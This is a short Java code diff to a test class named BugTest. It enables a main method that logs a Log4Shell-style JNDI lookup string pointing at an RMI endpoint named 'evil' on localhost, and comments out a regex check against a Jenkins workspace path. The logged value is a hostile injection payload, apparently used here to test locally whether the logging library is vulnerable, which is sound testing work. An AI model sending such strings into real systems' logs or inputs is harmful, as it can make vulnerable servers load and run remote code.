@@ -10,16 +10,16 @@ public class BugTest {
 
     private final static Logger LOGGER = LogManager.getLogger(BugTest.class);
 
-    /*public static void main(String[] args) {
+    public static void main(String[] args) {
         String username = "";
         LOGGER.info("${jndi:rmi://localhost:1099/evil}");
-    }*/
+    }
 
-    public static void main(String[] args) {
+   /* public static void main(String[] args) {
 
         Pattern p = Pattern.compile(".*tmssi.war*");
         Matcher m = p.matcher("/var/jenkins_home/workspace/test1/yihuisoft-service/target/tmssi.war");
         LOGGER.info(m.matches());
-    }
+    }*/
 
 }
